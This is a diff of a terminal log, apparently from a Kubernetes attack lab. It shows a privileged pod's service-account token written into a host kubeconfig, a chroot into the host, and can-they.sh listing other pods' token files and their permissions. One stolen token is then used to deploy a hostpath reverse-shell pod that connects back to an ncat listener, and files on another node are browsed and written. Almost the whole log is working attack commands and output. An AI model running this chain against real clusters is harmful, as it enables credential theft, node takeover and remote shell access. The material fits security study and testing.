@@ -1,24 +1,82 @@
-ubuntu@test-master:~$ kubectl exec -it -n spark-operator everything-allowed-exec-pod-4  -- chroot /host bash
-root@test-master2:/# ip -4 addr show | grep inet
+ubuntu@test-master:~$ kubectl exec -it -n spark-operator everything-allowed-exec-pod-4 -- bash
+root@test-master2:/# cat <<EOF > /tmp/kubeconfig
+apiVersion: v1
+kind: Config
+clusters:
+- cluster:
+    certificate-authority: /etc/kubernetes/pki/ca.crt
+    server: https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
+  name: in-cluster
+contexts:
+- context:
+    cluster: in-cluster
+    namespace: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+    user: default
+  name: in-cluster
+current-context: in-cluster
+users:
+- name: default
+  user:
+    token: $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+EOF
+mkdir /host/root/.kube/
+cp /tmp/kubeconfig /host/root/.kube/config
+root@test-master2:/# chroot /host bash
+root@test-master2:/# cd /root
+root@test-master2:~# ls -l .kube/
+total 4
+-rw-r--r-- 1 root root 1381 Jul 15 18:44 config
+root@test-master2:~# cd badPods/scripts/
+root@test-master2:~/badPods/scripts# ls
+can-they.sh
+root@test-master2:~/badPods/scripts# chmod 755 can-they.sh
+root@test-master2:~/badPods/scripts# ./can-they.sh | grep pods
+find: '/host/var/lib/kubelet/pods/': No such file or directory
+Token Location: /var/lib/kubelet/pods/e5f4d46c-6bf6-40ac-9dcb-e96a3e62d91e/volumes/kubernetes.io~projected/kube-api-access-m6m9z/token
+Token Location: /var/lib/kubelet/pods/0d103c48-b5a4-43ab-84ae-e46e1ca0dc4b/volumes/kubernetes.io~projected/kube-api-access-jfvnr/token
+pods                                            []                                     []               [get list watch]
+pods/status                                     []                                     []               [patch]
+Token Location: /var/lib/kubelet/pods/2f091e72-307f-49bc-a08b-9b220ea24af3/volumes/kubernetes.io~projected/kube-api-access-rr5jl/token
+Token Location: /var/lib/kubelet/pods/263beb85-ad76-45f9-a7e5-a00cf155e219/volumes/kubernetes.io~projected/kube-api-access-m64d7/token
+pods                                                           []                                     []               [*]
+Token Location: /var/lib/kubelet/pods/84ca633b-a050-4671-834a-21485a762923/volumes/kubernetes.io~projected/kube-api-access-xrx55/token
+Token Location: /var/lib/kubelet/pods/05beb61c-7c35-4219-a03e-610af2f429e7/volumes/kubernetes.io~projected/kube-api-access-dr8kj/token
+root@test-master2:~/badPods/scripts# export cred=`cat /var/lib/kubelet/pods/263beb85-ad76-45f9-a7e5-a00cf155e219/volumes/kubernetes.io~projected/kube-api-access-m64d7/token`
+root@test-master2:~/badPods/scripts# ls
+can-they.sh
+root@test-master2:~/badPods/scripts# cd ..
+root@test-master2:~/badPods# cd manifests/hostpath/pod/
+root@test-master2:~/badPods/manifests/hostpath/pod# ip -4 addr show | grep inet
     inet 127.0.0.1/8 scope host lo
     inet 172.22.14.33/24 metric 100 brd 172.22.14.255 scope global dynamic ens3
-root@test-master2:/# ncat --ssl -vlp 8080
-Ncat: Version 7.80 ( https://nmap.org/ncat )
+root@test-master2:~/badPods/manifests/hostpath/pod# ncat --ssl -vlp 8080 &
+[1] 664321
+root@test-master2:~/badPods/manifests/hostpath/pod# Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
-Ncat: SHA-1 fingerprint: 0AF0 C746 E4EE 0BBC DB94 F180 FB7A 51CF D61C D3BD
+Ncat: SHA-1 fingerprint: C454 DC92 2D8D 20B4 3CF7 C891 592C B38E 3D21 195D
 Ncat: Listening on :::8080
 Ncat: Listening on 0.0.0.0:8080
-Ncat: Connection from 192.168.101.99.
-Ncat: Connection from 192.168.101.99:51018.
-cd /host/
+
+root@test-master2:~/badPods/manifests/hostpath/pod# HOST="172.22.14.33" PORT="8080" envsubst < ./hostpath-revshell-pod.yaml | kubectl apply --token=$cred -n default -f -; fg
+pod/hostpath-revshell-pod created
+ncat --ssl -vlp 8080
+Ncat: Connection from 192.168.101.114.
+Ncat: Connection from 192.168.101.114:54324.
+cd /host
 cd home
 cd ubuntu
 ls
 calico-bpf.yml
 disable_proxy.txt
-message2
 pod_network_setup.txt
 test
-rm message2
+echo hello > message
+ls
+calico-bpf.yml
+disable_proxy.txt
+message
+pod_network_setup.txt
+test
 exit
+root@test-master2:~/badPods/manifests/hostpath/pod#
 
